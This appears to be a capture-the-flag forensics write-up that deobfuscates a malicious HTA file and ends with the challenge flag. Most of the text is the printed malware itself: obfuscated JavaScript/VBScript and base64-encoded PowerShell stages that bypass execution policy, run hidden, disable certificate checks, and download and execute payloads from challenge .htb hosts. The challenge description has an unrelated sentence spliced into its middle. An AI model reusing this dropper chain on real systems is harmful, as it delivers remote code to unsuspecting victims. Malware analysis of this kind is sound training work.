# Frontier Exposed
- **Category:** Forensics
- **Difficulty:** Easy
- **Description:** "A routine patrol through the Frontier Cluster's shadowy corners uncovered a sinister file embedded in a bounty report—one targeting Jack Colt himself. The file’s obfuscated layers suggest it's more than a simple message; it’s a weaponized codNote: Ensure all domains discovered in the challenge resolve to your Docker instance, including the appropriate port when accessing URLs.e from the Frontier Board, aiming to tighten their grip on the stars. As a trusted ally, it's your task to peel back the layers of deception trace its origin, and turn their tools against them. Every domain found in the challenge should resolve to your docker instance. Do not forget to add the port when visiting the URLs."
- **files:** Wanted.hta : 199cd7368091953a26765063bb23813a607cfd493a4a242828c0bcf916ea7000 

After downling the file and open it, we can see that it is an URL encoded file :

![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/3.png)

We can try to decode the file by doing some simple substitution : 
  - %2525 --> %25
  - %25 --> %25
  - %20 --> (space)
  - (space) --> nothing

we obtain :
```
<scriptlanguage=JavaScript>m='%3Cscriptlanguage%3DJavaScript%3Em%3D%27%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%3Cscriptlanguage%3DJavaScript%3Em%3D%27%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%3C%21DOCTYPEhtml%3E%0A%3Cmetahttp-equiv%3D%22X-UA-Compatible%22content%3D%22IE%3DEmulateIE8%22%3E%0A%3Chtml%3E%0A%3Cbody%3E%0A%3CsCrIPTlANgUAge%3D%22VbScRipT%22%3E%0ADiM252520OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF%2CPoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM%3AsetOCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF%3DcreateoBjEct%28Chr%28%26H57%29%26%22SCRIPT.shELL%22%29%3APoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM%3D%22PowErShEll-ExBYPaSS-NOP-W1-CdEVIcEcrEDEnTIAlDePlOYmENt.EXe%3Biex%28%24%28iEX%28%27%5BSYsTeM.TeXt.EnCoding%5D%27+%5BchAr%5D0X3A+%5BCHAr%5D0X3A+%27uTf8.geTSTring%28%5BSYstem.ConVERT%5D%27+%5BchAR%5D58+%5BCHAR%5D58+%27fRoMBASE64string%28%27+%5BCHar%5D0X22+%27JGVhNmM4bXJUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1UeXBlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW1lTUJlckRlZmluSVRJb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnW0RsbEltcG9ydCgidVJMbU9OLmRsTCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFVSTERvd25sb2FkVG9GaWxlKEludFB0ciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBHLHN0cmluZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENmbXIsc3RyaW5nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYVV2eVZCUkQsdWludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZmWWxEb2wsSW50UHRyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb0ZYckloKTsnICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW5BTUUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiU3V4dFBJQkp4bCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtTmFtRXNQQWNFICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbklZcCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1QYXNzVGhydTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZWE2YzhtclQ6OlVSTERvd25sb2FkVG9GaWxlKDAsImh0dHA6Ly93YW50ZWQuYWxpdmUuaHRiLzM1L3dhbnRlZC50SUYiLCIkZU52OkFQUERBVEFcd2FudGVkLnZicyIsMCwwKTtTVEFSdC1zbGVlUCgzKTtzdEFSdCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkZW5WOkFQUERBVEFcd2FudGVkLnZicyI=%27+%5BcHar%5D0X22+%27%29%29%27%29%29%29%22%3AOCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.rUNchR%2834%29%26OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.eXpanDEnVIroNMENtSTRinGs%28Chr%28%26H25%29%26ChrW%28%26H53%29%26Chr%28%26H79%29%26ChrW%28%26H73%29%26ChrW%28%26H54%29%26ChrW%28%26H65%29%26ChrW%28%26H6D%29%26Chr%28%26H52%29%26ChrW%28%26H4F%29%26Chr%28%26H6F%29%26ChrW%28%26H74%29%26ChrW%28%26H25%29%29%26%22%5CSYStEM32%5CWINdOwSpoweRSheLL%5CV1.0%5CPoWERshElL.ExE%22%26chr%2834%29%26cHR%2832%29%26Chr%2834%29%26PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM%26CHr%2834%29%2C0%3ASETOCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF%3DNOThING%0ASeLF.CloSE%0A%3C/script%3E%0A%0A%3C/body%3E%0A%3C/html%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E%27%3Bd%3Dunescape%28m%29%3Bdocument.write%28d%29%3B%3C/script%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E%27%3Bd%3Dunescape%28m%29%3Bdocument.write%28d%29%3B%3C/script%3E';d=unescape(m);document.write(d);</script>
```

We can then see that it uses a base64 encoding as written here : 

![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/4.png)

We copy the adequate code into cyberchef to decode it :

![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/5.png)

In the decoded code, we can observe a .htb with a subdomain that we give to the docker and it download another file called : wanted.tiF (24ca7385df40934a241d8c6859a00d0b8288294a8d7e953ba3fdea7fa3e01631)

The file contains huge amount of code but by going through it we can see that this part of code seems akward :

```
If Not mesor() Then
        
        On Error Resume Next

        latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe"
        latifoliado = latifoliado & "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl"
        latifoliado = latifoliado & "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc"
        latifoliado = latifoliado & "CcpKSkpd2FudGVkCgd2FudGVkCg"
        
        Dim parrana
        parrana = "d2FudGVkCg"

        Dim arran
        arran =" d2FudGVkCg  d2FudGVkCg "
        arran = arran & "$d2FudGVkCgCod2FudGVkCgd"
        arran = arran & "id2FudGVkCggod2FudGVkCg "
        arran = arran & "d2FudGVkCg" & latifoliado & "d2FudGVkCg"
        arran = arran & "$d2FudGVkCgOWd2FudGVkCgj"
        arran = arran & "ud2FudGVkCgxdd2FudGVkCg "
        arran = arran & "=d2FudGVkCg [d2FudGVkCgs"
        arran = arran & "yd2FudGVkCgstd2FudGVkCge"
        arran = arran & "md2FudGVkCg.Td2FudGVkCge"
        arran = arran & "xd2FudGVkCgt.d2FudGVkCge"
        arran = arran & "nd2FudGVkCgcod2FudGVkCgd"
        arran = arran & "id2FudGVkCgngd2FudGVkCg]"
        arran = arran & ":d2FudGVkCg:Ud2FudGVkCgT"
        arran = arran & "Fd2FudGVkCg8.d2FudGVkCgG"
        arran = arran & "ed2FudGVkCgtSd2FudGVkCgt"
        arran = arran & "rd2FudGVkCgind2FudGVkCgg"
        arran = arran & "(d2FudGVkCg[sd2FudGVkCgy"
        arran = arran & "sd2FudGVkCgted2FudGVkCgm"
        arran = arran & ".d2FudGVkCgCod2FudGVkCgn"
        arran = arran & "vd2FudGVkCgerd2FudGVkCgt"
        arran = arran & "]d2FudGVkCg::d2FudGVkCgF"
        arran = arran & "rd2FudGVkCgomd2FudGVkCgb"
        arran = arran & "ad2FudGVkCgsed2FudGVkCg6"
        arran = arran & "4d2FudGVkCgStd2FudGVkCgr"
        arran = arran & "id2FudGVkCgngd2FudGVkCg("
        arran = arran & "$d2FudGVkCgcod2FudGVkCgd"
        arran = arran & "id2FudGVkCggod2FudGVkCg)"
        arran = arran & ")d2FudGVkCg;pd2FudGVkCgo"
        arran = arran & "wd2FudGVkCgerd2FudGVkCgs"
        arran = arran & "hd2FudGVkCgeld2FudGVkCgl"
        arran = arran & ".d2FudGVkCgexd2FudGVkCge"
        arran = arran & " d2FudGVkCg-wd2FudGVkCgi"
        arran = arran & "nd2FudGVkCgdod2FudGVkCgw"
        arran = arran & "sd2FudGVkCgtyd2FudGVkCgl"
        arran = arran & "ed2FudGVkCg hd2FudGVkCgi"
        arran = arran & "dd2FudGVkCgded2FudGVkCgn"
        arran = arran & " d2FudGVkCg-ed2FudGVkCgx"
        arran = arran & "ed2FudGVkCgcud2FudGVkCgt"
        arran = arran & "id2FudGVkCgond2FudGVkCgp"
        arran = arran & "od2FudGVkCglid2FudGVkCgc"
        arran = arran & "yd2FudGVkCg bd2FudGVkCgy"
        arran = arran & "pd2FudGVkCgasd2FudGVkCgs"
        arran = arran & " d2FudGVkCg-Nd2FudGVkCgo"
        arran = arran & "Pd2FudGVkCgrod2FudGVkCgf"
        arran = arran & "id2FudGVkCgled2FudGVkCg "
        arran = arran & "-d2FudGVkCgcod2FudGVkCgm"
        arran = arran & "md2FudGVkCgand2FudGVkCgd"
        arran = arran & " d2FudGVkCg$Od2FudGVkCgW"
        arran = arran & "jd2FudGVkCguxd2FudGVkCgD"
        arran = descortinar(arran, parrana, "")
            
        Dim sandareso
        sandareso = "pd2FudGVkCgo"
        sandareso = sandareso & "wd2FudGVkCgr"
        sandareso = sandareso & "sd2FudGVkCge"
        sandareso = sandareso & "ld2FudGVkCgl -cd2FudGVkCgommad2FudGVkCgnd "
        sandareso = descortinar(sandareso, parrana, "")

        sandareso = sandareso & arran

        Dim incentiva
        Set incentiva = CreateObject("WScript.Shell")
        incentiva.Run sandareso, 0, False 
        WScript.Quit(rumbo)
            
End If
```
By analyzing the code, we can clearly see that there is still obsfucation in the code that we can remove which gives us 

```
If Not mesor() Then
        
        On Error Resume Next

        latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTe"
        latifoliado = latifoliado & "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZGl"
        latifoliado = latifoliado & "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19yc"
        latifoliado = latifoliado & "CcpKSkp"
        
        Dim parrana
        parrana = ""

        Dim arran
        arran ="    "
        arran = arran & "$Cod"
        arran = arran & "igo "
        arran = arran & "" & latifoliado & ""
        arran = arran & "$OWj"
        arran = arran & "uxd "
        arran = arran & "= [s"
        arran = arran & "yste"
        arran = arran & "m.Te"
        arran = arran & "xt.e"
        arran = arran & "ncod"
        arran = arran & "ing]"
        arran = arran & "::UT"
        arran = arran & "F8.G"
        arran = arran & "etSt"
        arran = arran & "ring"
        arran = arran & "([sy"
        arran = arran & "stem"
        arran = arran & ".Con"
        arran = arran & "vert"
        arran = arran & "]::F"
        arran = arran & "romb"
        arran = arran & "ase6"
        arran = arran & "4Str"
        arran = arran & "ing("
        arran = arran & "$cod"
        arran = arran & "igo)"
        arran = arran & ");po"
        arran = arran & "wers"
        arran = arran & "hell"
        arran = arran & ".exe"
        arran = arran & " -wi"
        arran = arran & "ndow"
        arran = arran & "styl"
        arran = arran & "e hi"
        arran = arran & "dden"
        arran = arran & " -ex"
        arran = arran & "ecut"
        arran = arran & "ionp"
        arran = arran & "olic"
        arran = arran & "y by"
        arran = arran & "pass"
        arran = arran & " -No"
        arran = arran & "Prof"
        arran = arran & "ile "
        arran = arran & "-com"
        arran = arran & "mand"
        arran = arran & " $OW"
        arran = arran & "juxD"
        arran = descortinar(arran, parrana, "")
            
        Dim sandareso
        sandareso = "po"
        sandareso = sandareso & "wr"
        sandareso = sandareso & "se"
        sandareso = sandareso & "ll -command "
        sandareso = descortinar(sandareso, parrana, "")

        sandareso = sandareso & arran

        Dim incentiva
        Set incentiva = CreateObject("WScript.Shell")
        incentiva.Run sandareso, 0, False 
        WScript.Quit(rumbo)
            
End If
```
We can read a kind of powershell command in the arran variable and there is another base64 encoding and after analyzing we see that the variable is latifoliado and by giving it again to cyberchef, we can decode to :

![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/6.png)


This give us another .htb with a sub-domain and by accessing the website, we obtain the flag :

![image](https://github.com/KimiNoPanda/CTF/blob/main/Write-up/HTB-Uni%20%3A%20Binary%20Badlands/Forensics/assets/7.png)

flag : HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_5720876b4529e04e685e94557c88b049}
